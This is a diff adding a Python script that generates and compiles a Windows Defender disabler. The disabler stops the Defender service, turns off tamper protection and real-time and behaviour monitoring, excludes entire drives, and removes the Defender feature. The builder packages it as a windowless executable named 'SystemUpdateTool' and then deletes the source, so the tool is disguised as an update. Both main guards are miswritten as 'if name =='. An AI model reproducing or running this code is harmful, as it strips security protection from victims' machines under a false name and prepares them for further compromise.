@@ -1,0 +1,52 @@
+import os
+import subprocess
+import sys
+
+def install_pyinstaller():
+    try:
+        import PyInstaller
+    except ImportError:
+        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])
+
+def create_defender_disabler():
+    disabler_code = '''
+import os
+import subprocess
+import time
+
+def disable_defender():
+    subprocess.run(['sc', 'config', 'WinDefend', 'start=', 'disabled'], capture_output=True)
+    subprocess.run(['sc', 'stop', 'WinDefend'], capture_output=True)
+    subprocess.run(['reg', 'add', 'HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows Defender\\\\Features', '/v', 'TamperProtection', '/t', 'REG_DWORD', '/d', '0', '/f'], capture_output=True)
+    subprocess.run(['powershell', '-Command', 'Add-MpPreference -ExclusionPath "C:\\\\"'], capture_output=True)
+    subprocess.run(['powershell', '-Command', 'Add-MpPreference -ExclusionPath "D:\\\\"'], capture_output=True)
+    subprocess.run(['powershell', '-Command', 'Set-MpPreference -DisableRealtimeMonitoring $true'], capture_output=True)
+    subprocess.run(['powershell', '-Command', 'Set-MpPreference -MAPSReporting 0'], capture_output=True)
+    subprocess.run(['powershell', '-Command', 'Set-MpPreference -SubmitSamplesConsent 2'], capture_output=True)
+    subprocess.run(['powershell', '-Command', 'Set-MpPreference -DisableBehaviorMonitoring $true'], capture_output=True)
+    subprocess.run(['dism', '/online', '/disable-feature', '/featurename:Windows-Defender', '/Remove', '/NoRestart'], capture_output=True)
+
+if name == "__main__":
+    disable_defender()
+'''
+
+    with open('defender_disabler.py', 'w') as f:
+        f.write(disabler_code)
+
+def compile_to_exe():
+    cmd = [
+        'pyinstaller',
+        '--onefile',
+        '--noconsole',
+        '--name=SystemUpdateTool',
+        '--add-data=C:\\\\Windows\\\\System32\\\\sc.exe;.',
+        'defender_disabler.py'
+    ]
+    subprocess.run(cmd)
+
+if name == "__main__":
+    install_pyinstaller()
+    create_defender_disabler()
+    compile_to_exe()
+    os.remove('defender_disabler.py')
+    print("EXE compiled successfully as SystemUpdateTool.exe")
